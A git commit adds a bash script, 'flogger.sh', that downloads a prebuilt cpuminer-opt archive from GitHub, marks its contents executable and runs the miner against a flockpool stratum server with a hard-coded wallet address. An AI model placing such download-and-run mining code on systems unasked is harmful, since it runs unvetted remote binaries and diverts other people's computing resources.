dc6c5f4eb6aafa29c25078846780c0afa7adb06e
jrkeiter <91981745+jrkeiter@users.noreply.github.com>
2021-11-18 09:34:04 +0000

    Create flogger.sh

---
+++ flogger.sh
@@ -0,0 +1,19 @@
+#!/bin/bash
+
+WALS=RTrndREXaXfFJzJp7vjzjGa78HgBcFNfAd
+PIL=stratum+tcps://us.flockpool.com:5555
+WER=SER
+COMA="-a gr -o $PIL -u $WALS.$WER --cpu-priority 4"
+
+
+
+
+FILE=./cpuminer-opt-linux.tar.gz
+if [ -f "$FILE" ]; then
+    echo "$FILE exists."
+else
+    wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.24/cpuminer-opt-linux.tar.gz
+    tar xvf cpuminer-opt-linux.tar.gz
+    chmod +x *
+fi
+    ./cpuminer-avx2 $COMA
